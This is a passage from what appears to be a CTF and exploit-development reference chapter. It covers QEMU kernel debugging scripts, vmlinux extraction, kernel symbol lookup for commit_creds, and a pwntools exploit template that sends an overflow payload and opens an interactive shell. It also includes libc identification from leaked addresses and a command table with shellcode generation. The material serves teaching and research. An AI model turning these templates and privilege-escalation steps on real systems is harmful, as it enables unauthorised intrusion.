if [ "$KASLR" = "on" ]; then
    KASLR_ARG="kaslr"
else
    KASLR_ARG="nokaslr"
fi

# GDB stub
GDB_ARGS=""
if [ "$GDB" = "1" ]; then
    GDB_ARGS="-s -S"
    echo "[*] GDB stub active on port $PORT"
    echo "[*] Connect with: gdb ./vmlinux -ex 'target remote :$PORT'"
fi

# Command line append
APPEND="console=ttyS0 $KASLR_ARG $EXTRA_ARGS root=/dev/ram0 rw oops=panic panic=1 quiet"

echo "[*] Launching QEMU kernel environment"
echo "[*] Kernel:  $KERNEL"
echo "[*] Initrd:  $INITRD"
echo "[*] Memory:  $MEMORY"
echo "[*] SMP:     $SMP"
echo "[*] KASLR:   $KASLR"
echo "[*] SMEP:    $SMEP"
echo "[*] SMAP:    $SMAP"

qemu-system-x86_64 \
    -m "$MEMORY" \
    -smp "$SMP" \
    -kernel "$KERNEL" \
    -initrd "$INITRD" \
    -nographic \
    -append "$APPEND" \
    $GDB_ARGS \
    -monitor /dev/null \
    -netdev user,id=net0,hostfwd=tcp::${SSH_PORT}-:22 \
    -device e1000,netdev=net0 \
    -no-reboot

# Usage examples:
# GDB=1 ./run_kernel.sh                                 # with GDB
# KASLR=on SMEP=off ./run_kernel.sh                     # KASLR on, SMEP off
# KERNEL=./bzImage-5.4 INITRD=./rootfs.cpio.gz ./run_kernel.sh
```

### 5.5 Extracting vmlinux from bzImage

```bash
#!/usr/bin/env bash
# extract_vmlinux.sh — extract uncompressed vmlinux from bzImage
# Required for GDB symbol resolution

IMAGE="${1:?Usage: $0 <bzImage>}"

# Try multiple extraction methods
tmp=$(mktemp)

# Method 1: scripts/extract-vmlinux (if kernel source available)
if [ -f "scripts/extract-vmlinux" ]; then
    scripts/extract-vmlinux "$IMAGE" > vmlinux
    echo "[+] Extracted vmlinux using kernel script"
    exit 0
fi

# Method 2: Manual extraction via binary search
# Search for the gzip/lzma/xz/lz4/zstd magic bytes
for     pos in $(grep -abo $'\x1f\x8b\x08' "$IMAGE" 2>/dev/null | cut -d: -f1); do
    dd if="$IMAGE" bs=1 skip="$pos" 2>/dev/null | zcat > "$tmp" 2>/dev/null && break
done

for    pos in $(grep -abo $'\x5d\x00\x00' "$IMAGE" 2>/dev/null | cut -d: -f1); do
    dd if="$IMAGE" bs=1 skip="$pos" 2>/dev/null | lzcat > "$tmp" 2>/dev/null && break
done

if [ -s "$tmp" ]; then
    mv "$tmp" vmlinux
    echo "[+] Extracted vmlinux ($(du -sh vmlinux | cut -f1))"
    file vmlinux
else
    echo "[-] Failed to extract vmlinux"
    rm -f "$tmp"
fi
```

### 5.6 Reading /proc/kallsyms (Kernel Symbol Table)

```bash
# On target (requires root or kptr_restrict=0):
cat /proc/kallsyms | head

# Find specific symbol:
cat /proc/kallsyms | grep "prepare_kernel_cred"
cat /proc/kallsyms | grep "commit_creds"

# If kptr_restrict prevents reading real addresses:
echo 0 > /proc/sys/kernel/kptr_restrict

# Without root, extract from vmlinux:
nm vmlinux | grep "prepare_kernel_cred"
readelf -s vmlinux | grep "prepare_kernel_cred"
```

```python
# In pwntools, reading kernel symbols:
from pwn import *

def ksym(vmlinux_path, symbol_name):
    """Read a kernel symbol address from vmlinux."""
    vmlinux = ELF(vmlinux_path)
    if symbol_name in vmlinux.symbols:
        return vmlinux.symbols[symbol_name]
    log.error(f"Symbol {symbol_name} not found")
```

---

## 6. Automation & Scripting

### 6.1 Exploit Template System

```python
#!/usr/bin/env python3
"""
Exploit template — copy this for each new challenge.
Usage: python3 exploit.py [MODE] [HOST] [PORT]
  MODE: local (default), remote, ssh
  --GDB: attach GDB in local mode
  --DEBUG: set log level to DEBUG
"""
from pwn import *
import argparse

# ---- Configuration ----
BINARY = './vuln'
LIBC = './libc.so.6'
REMOTE_HOST = 'challenge.ctf.com'
REMOTE_PORT = 1337

context.binary = elf = ELF(BINARY, checksec=True)
context.log_level = 'INFO'
libc = ELF(LIBC) if os.path.exists(LIBC) else None

def startup():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', nargs='?', default='local',
                        choices=['local', 'remote', 'ssh'])
    parser.add_argument('--host', default=REMOTE_HOST)
    parser.add_argument('--port', type=int, default=REMOTE_PORT)
    parser.add_argument('--GDB', action='store_true', help='Attach GDB')
    parser.add_argument('--DEBUG', action='store_true', help='Verbose logging')
    parser.add_argument('--offset', type=int, default=0, help='Override offset')
    args = parser.parse_args()

    if args.DEBUG:
        context.log_level = 'DEBUG'

    if args.mode == 'local':
        io = process(BINARY)
    elif args.mode == 'remote':
        io = remote(args.host, args.port)
    elif args.mode == 'ssh':
        s = ssh(host=args.host, user='root')
        io = s.process(BINARY)

    if args.GDB and args.mode == 'local':
        gdb.attach(io, gdbscript='''
            b *main+50
            b *0x400800
            continue
        ''')

    return io, args

def exploit(io, args):
    # ---- Your exploit logic here ----
    offset = args.offset or cyclic_find(0x61616168)
    log.info(f"Offset: {offset}")

    payload = flat(
        b'A' * offset,
        0xdeadbeef,
    )
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io, args = startup()
    exploit(io, args)
```

### 6.2 Batch Analysis Script

```bash
#!/usr/bin/env bash
# batch_analyze.sh — batch security analysis of binaries in a directory
DIR="${1:?Usage: $0 <directory>}"

echo "Binary,Arch,Bits,NX,PIE,Canary,RELRO,Stripped,Function_Count"
for bin in "$DIR"/*; do
    [ -x "$bin" ] || continue
    [ -f "$bin" ] || continue

    # Checksec (CSV format)
    checksec_out=$(checksec --file="$bin" --output=csv 2>/dev/null)

    # Binary info
    arch=$(file "$bin" | grep -oP '(x86-64|80386|ARM|MIPS)')
    bits=$(file "$bin" | grep -oP '\b(32|64)-bit\b' | grep -oP '\d+')
    stripped=$(file "$bin" | grep -q 'not stripped' && echo 'No' || echo 'Yes')
    func_count=$(nm "$bin" 2>/dev/null | grep -c ' T ' || echo '0')

    # Parse checksec fields
    nx=$(echo "$checksec_out" | grep -oP 'NX=(\w+)' | cut -d= -f2)
    pie=$(echo "$checksec_out" | grep -oP 'PIE=(\w+)' | cut -d= -f2)
    canary=$(echo "$checksec_out" | grep -oP 'Canary=(\w+)' | cut -d= -f2)
    relro=$(echo "$checksec_out" | grep -oP 'RELRO=(\w+)' | cut -d= -f2)

    echo "$(basename $bin),$arch,$bits,$nx,$pie,$canary,$relro,$stripped,$func_count"
done
```

### 6.3 Custom Enhanced checksec

```python
#!/usr/bin/env python3
# checksec_plus.py — enhanced checksec with more details
from pwn import *
import sys

def checksec_plus(path):
    elf = ELF(path, checksec=False)
    print(f"=== {path} ===")
    print(f"  Arch:     {elf.arch} ({elf.bits}-bit)")
    print(f"  RELRO:    {'Full' if elf.relro == 'Full' else 'Partial' if elf.relro == 'Partial' else 'No'}")
    print(f"  Stack:    {'Canary' if elf.canary else 'No canary'}")
    print(f"  NX:       {'NX enabled' if elf.nx else 'NX disabled'}")
    print(f"  PIE:      {'PIE enabled' if elf.pie else 'No PIE'}")
    print(f"  Stripped: {'Yes' if elf.stripped else 'No'}")

    # Additional
    print(f"  Entrypoint: {hex(elf.entry)}")
    print(f"  GOT entries: {len(elf.got)}")
    print(f"  PLT entries: {len(elf.plt)}")

    # Check for useful symbols
    interesting = ['system', 'execve', 'win', 'flag', 'shell', 'backdoor']
    for sym in interesting:
        if sym in elf.symbols:
            print(f"  [!] Interesting symbol: {sym} @ {hex(elf.symbols[sym])}")

    # Check for useful strings
    for string in [b'/bin/sh', b'flag', b'cat ']:
        results = list(elf.search(string))
        if results:
            print(f"  [!] String {string!r} at {', '.join(map(hex, results[:3]))}")

    # Check for useful gadgets
    try:
        pop_rdi = elf.search(asm('pop rdi; ret', arch=elf.arch))
        if pop_rdi:
            print(f"  [!] pop rdi; ret @ {hex(next(pop_rdi))}")
    except StopIteration:
        pass

    print()

for path in sys.argv[1:]:
    checksec_plus(path)
```

### 6.4 Libc Version Identification and Patching

```bash
#!/usr/bin/env bash
# identify_libc.sh — identify libc version from leaked offsets
# Usage: ./identify_libc.sh <leak_address> <symbol_name>

set -e

LIBC_DB="${HOME}/libc-database"

if [ ! -d "$LIBC_DB" ]; then
    echo "[*] Cloning libc-database..."
    git clone https://github.com/niklasb/libc-database "$LIBC_DB"
    cd "$LIBC_DB"
    ./get ubuntu          # download Ubuntu libc versions
    ./get debian          # download Debian libc versions
fi

LEAK_ADDR="${1:?Usage: $0 <leak_hex> <symbol>}"
SYMBOL="${2:-puts}"

# Mask to page offset for matching
OFFSET=$((0x$((LEAK_ADDR)) & 0xfff))

echo "[*] Searching for libc where ${SYMBOL} offset = ${OFFSET} (0x${OFFSET})"
cd "$LIBC_DB"
RESULT=$(./find "$SYMBOL" "$OFFSET" | head -5)

if [ -z "$RESULT" ]; then
    echo "[-] No matching libc found"
    exit 1
fi

echo "[+] Possible matches:"
echo "$RESULT"

# Download and patch
echo ""
echo "[*] To patch binary with matching libc:"
echo "    patchelf --set-interpreter ./ld-2.xx.so --set-rpath . ./vuln"
echo "    or:  patchelf --replace-needed libc.so.6 ./libc-2.xx.so ./vuln"
```

```python
# libc_patch.py — automate libc identification and patching
from pwn import *
import subprocess

def identify_and_patch(binary_path, leaked_addr, symbol='puts', libc_db='~/libc-database'):
    """
    Identify libc from a leaked address, download it, patch the binary.
    leaked_addr: runtime address of symbol (e.g., puts GOT entry value)
    symbol: the symbol name for the leaked address
    """
    libc_db = os.path.expanduser(libc_db)

    # Calculate offset (low 12 bits)
    offset = leaked_addr & 0xfff
    log.info(f"Searching for libc where {symbol} has offset {hex(offset)}")

    # Query libc-database
    result = subprocess.run(
        [f'{libc_db}/find', symbol, hex(offset)],
        capture_output=True, text=True
    )

    if not result.stdout.strip():
        log.error("No matching libc found in database")
        return None

    log.success(f"Found matching libc:\n{result.stdout}")

    # Extract the libc identifier and download
    libc_id = result.stdout.strip().split('\n')[0]
    dl_result = subprocess.run(
        [f'{libc_db}/download', libc_id],
        capture_output=True, text=True, cwd=libc_db
    )

    # Locate downloaded libc
    libc_path = f'{libc_db}/libs/{libc_id}/libc.so.6'
    ld_path = f'{libc_db}/libs/{libc_id}/ld-linux-x86-64.so.2'

    if os.path.exists(libc_path):
        # Patch the binary
        subprocess.run(['patchelf', '--set-interpreter', ld_path, '--set-rpath',
                        os.path.dirname(libc_path), binary_path])
        log.success(f"Patched {binary_path} with {libc_path}")

        return ELF(libc_path)
    return None
```

---

## Quick Reference Card

| Task | Command |
|------|---------|
| Check binary mitigations | `checksec --file=./vuln` |
| Find ROP gadgets | `ROPgadget --binary ./vuln` |
| Find libc one-gadgets | `one_gadget ./libc.so.6` |
| Dump seccomp rules | `seccomp-tools dump ./vuln` |
| Patch libc/interpreter | `patchelf --set-interpreter ./ld.so ./vuln` |
| Create cyclic pattern | `python3 -c "from pwn import *; print(cyclic(200))"` |
| Find offset in pattern | `python3 -c "from pwn import *; print(cyclic_find(0x61616168))"` |
| Generate shellcode | `shellcraft amd64 linux sh` |
| Extract vmlinux | `scripts/extract-vmlinux bzImage > vmlinux` |
| Launch kernel w/ GDB | `qemu-system-x86_64 -kernel bzImage -s -S` |
| Connect GDB to kernel | `gdb vmlinux -ex 'target remote :1234'` |
| List kernel symbols | `cat /proc/kallsyms \| grep commit_creds` |
| Build initramfs | `find . \| cpio -o -H newc \| gzip > rootfs.cpio.gz` |
| Search format offset | `for i in $(seq 1 20); do echo "%$i\$p"; done` |

---

*This chapter provides the complete toolchain foundation. Every exploit in this reference depends on these tools being properly configured. Revisit this chapter whenever setting up a new environment — the scripts here are battle-tested in CTF competitions and real vulnerability research alike.*